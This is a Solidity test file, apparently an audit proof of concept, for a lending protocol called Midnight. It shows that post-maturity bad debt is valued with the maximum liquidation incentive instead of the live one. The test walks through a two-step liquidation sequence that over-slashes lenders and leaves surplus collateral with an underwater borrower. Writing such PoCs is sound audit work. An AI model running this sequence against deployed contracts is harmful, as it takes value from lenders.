// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {
    WAD,
    ORACLE_PRICE_SCALE,
    TIME_TO_MAX_LIF,
    LLTV_0,
    LIQUIDATION_CURSOR_LOW
} from "../../src/libraries/ConstantsLib.sol";
import {IMidnight, Market, CollateralParams} from "../../src/interfaces/IMidnight.sol";
import {UtilsLib} from "../../src/libraries/UtilsLib.sol";
import {Oracle} from "../helpers/Oracle.sol";
import {ERC20} from "../erc20s/ERC20.sol";
import {BaseTest} from "../BaseTest.sol";

/// @title Finding 2 PoC: post-maturity bad debt is over-socialized using `maxLif` instead of the live `lif`.
/// @notice Post-maturity the live liquidation-incentive factor `lif` ramps from WAD up to `maxLif` over
/// `TIME_TO_MAX_LIF`. But the bad-debt computation (line 615 of Midnight.sol) values recoverable collateral
/// with `maxLif`, the maximum incentive, regardless of the live `lif`. Because `maxLif >= lif`, dividing the
/// collateral value by `maxLif` UNDER-counts what the collateral can actually repay at the current incentive,
/// so the realized bad debt is too large. Lenders are over-slashed and the still-recoverable surplus collateral
/// is freed back to the (underwater) borrower.
contract LiquidateMaxLifBadDebtPoC is BaseTest {
    using UtilsLib for uint256;

    Market internal market;
    bytes32 internal id;

    function setUp() public override {
        super.setUp();

        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 100;
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken1),
                lltv: LLTV_0, // 0.385e18
                maxLif: maxLif(LLTV_0, LIQUIDATION_CURSOR_LOW),
                oracle: address(oracle1)
            })
        );
        market.rcfThreshold = 0;
        id = toId(market);

        deal(address(loanToken), address(this), type(uint256).max);
    }

    function testMaxLifOverSocializesBadDebt() public {
        uint256 collat = 100e18; // collateral amount; value == 100e18 at price 1e36
        uint256 debt = 120e18;

        // Supply collateral on behalf of the borrower.
        deal(address(collateralToken1), borrower, collat);
        vm.startPrank(borrower);
        collateralToken1.approve(address(midnight), collat);
        midnight.supplyCollateral(market, 0, collat, borrower);
        vm.stopPrank();

        // Borrow 120 while the price is high enough to be healthy (maxDebt = 100*4*0.385 = 154 >= 120).
        oracle1.setPrice(4 * ORACLE_PRICE_SCALE);
        setupMarket(market, debt);
        assertEq(midnight.debtOf(id, borrower), debt, "initial debt");

        // Price falls so collateral value == 100 (< debt 120): the position is underwater.
        oracle1.setPrice(ORACLE_PRICE_SCALE);
        uint256 collateralValue = collat; // 100e18 at price 1e36

        // Move just past maturity: the live lif is ~WAD (essentially no liquidation incentive yet).
        vm.warp(market.maturity + 1);

        uint256 _maxLif = market.collateralParams[0].maxLif;
        uint256 liveLif =
            UtilsLib.min(_maxLif, WAD + (_maxLif - WAD) * (block.timestamp - market.maturity) / TIME_TO_MAX_LIF);

        // Bad debt the CONTRACT realizes (uses maxLif, exactly mirroring Midnight.sol line 614-616):
        uint256 badDebtMaxLif =
            debt - collat.mulDivUp(ORACLE_PRICE_SCALE, ORACLE_PRICE_SCALE).mulDivUp(WAD, _maxLif);
        // FAIR bad debt at the live lif actually used for seizure (collateral fully recoverable at live lif):
        uint256 fairBadDebt = debt - collateralValue.mulDivUp(WAD, liveLif);
        uint256 surplus = badDebtMaxLif - fairBadDebt;

        emit log_named_uint("maxLif (1e18)            ", _maxLif);
        emit log_named_uint("live lif at maturity+1   ", liveLif);
        emit log_named_uint("badDebt realized (maxLif)", badDebtMaxLif);
        emit log_named_uint("fair badDebt (live lif)  ", fairBadDebt);
        emit log_named_uint("surplus over-slashed     ", surplus);

        // Sanity: the realized bad debt matches the ~35.375e18 the maxLif math predicts, and the fair amount
        // at the live lif is ~20e18 — a ~15.375e18 gap.
        assertApproxEqAbs(badDebtMaxLif, 35.375e18, 1e9, "bad debt at maxLif ~= 35.375e18");
        // The live lif at maturity+1 is marginally above WAD, so the fair bad debt is marginally above 20e18.
        assertApproxEqAbs(fairBadDebt, 20e18, 1e17, "fair bad debt at live lif ~= 20e18");
        assertGt(surplus, 15e18, "material over-socialization");

        uint256 totalUnitsBefore = midnight.totalUnits(id);

        // STEP 1: ANY liquidate call (even 0/0) realizes the bad debt at maxLif and slashes lenders.
        midnight.liquidate(market, 0, 0, 0, borrower, true, address(this), address(0), "");

        uint256 realized = totalUnitsBefore - midnight.totalUnits(id);
        assertEq(realized, badDebtMaxLif, "contract socialized the maxLif bad debt to lenders");
        assertGt(realized, fairBadDebt, "lenders slashed MORE than the live-lif fair value");

        uint256 debtAfterBadDebt = midnight.debtOf(id, borrower);
        assertEq(debtAfterBadDebt, debt - badDebtMaxLif, "debt written down by the maxLif amount");

        // STEP 2: at the live lif the remaining debt is fully recoverable from the collateral, and the
        // surplus collateral is freed back to the borrower who was underwater. A liquidator (or the borrower
        // themselves) repays the remaining debt and the borrower keeps the leftover collateral.
        midnight.liquidate(market, 0, 0, debtAfterBadDebt, borrower, true, address(this), address(0), "");
        assertEq(midnight.debtOf(id, borrower), 0, "remaining debt fully repaid at live lif");

        uint256 retained = midnight.collateral(id, borrower, 0);
        emit log_named_uint("collateral retained by underwater borrower", retained);

        // The retained collateral value (~surplus) is exactly the value that, in a fair system valuing the
        // write-down at the live lif, would instead have repaid lenders. It leaked to the borrower.
        assertApproxEqAbs(retained, surplus, 1e16, "freed surplus ~= value over-slashed from lenders");
        assertGt(retained, 15e18, "material value leaked to a borrower who was deeply underwater");
    }
}
